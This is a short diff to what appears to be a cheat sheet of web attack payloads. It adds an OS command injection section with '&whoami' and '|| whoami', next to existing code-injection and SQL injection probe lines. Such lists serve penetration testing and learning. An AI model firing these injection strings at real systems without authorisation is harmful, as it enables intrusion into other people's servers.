@@ -125,6 +125,12 @@ codeinjection :
 ${@system(ls)} //filter bypass
 
 ----------------------------------------------
+#Os command injection
+&whoami
+|| whoami
+
+
+----------------------------------------------
 # SQL Injection (manual)
 photoalbum.php?id=1'
 
